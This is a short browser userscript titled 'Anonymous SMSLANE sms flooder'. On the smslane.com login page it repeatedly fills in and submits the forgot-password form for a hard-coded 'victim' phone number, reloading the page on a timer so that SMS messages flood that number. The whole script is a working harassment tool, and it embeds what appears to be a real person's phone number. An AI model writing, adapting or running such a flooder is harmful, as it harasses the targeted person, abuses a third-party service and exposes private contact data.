// ==UserScript==
// @name          Anonymous SMSLANE sms flooder
// @namespace     SUNNY020
// @description   flooder sms
// @include       http://*smslane.com/*
// @credits       One
// ==/UserScript==

var user=jhandu // enter user name
var victim=918092262928 //
var delay=1000; // Enter delay in milliseconds if required

if(document.location=="http://www.smslane.com/login.aspx"||document.location=="http://www.smslane.com/login.aspx")
{
document.getElementById('txtForgotUserId').value=user;
document.getElementById('txtForgotCell').value=victim;
document.getElementById('btnForgotPassword').click();
}
if(document.location=="http://www.smslane.com/login.aspx"||document.location=="http://www.smslane.com/login.aspx")
setTimeout("document.location='http://www.smslane.com/login.aspx'",delay);
